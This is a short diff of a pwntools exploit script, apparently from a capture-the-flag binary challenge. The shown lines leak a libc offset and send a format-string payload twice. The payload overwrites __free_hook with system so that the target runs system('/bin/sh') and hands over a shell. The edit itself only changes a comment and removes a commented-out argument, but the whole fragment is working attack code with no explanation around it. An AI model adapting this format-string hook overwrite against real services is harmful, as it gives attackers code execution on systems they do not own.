@@ -30,10 +30,10 @@ libc_off = u64(p.recv(6).ljust(8, b'\x00')) - start_off - 234
 
 log.info('Libc off: ' + hex(libc_off))
 
-#send fmtstr on both stk and heap to write system on freehook to call system('/bin/sh')
+#send fmtstr on both stk and heap to fmtstr write system on freehook to call system('/bin/sh')
 
 s = b'/bin/sh;' 
-s += fmtstr_payload(9, {libc_off + freehook_off: libc_off + system_off}, 8)#, 'short')
+s += fmtstr_payload(9, {libc_off + freehook_off: libc_off + system_off}, 8)
 
 for i in range(2):
     p.sendafter(':', s)
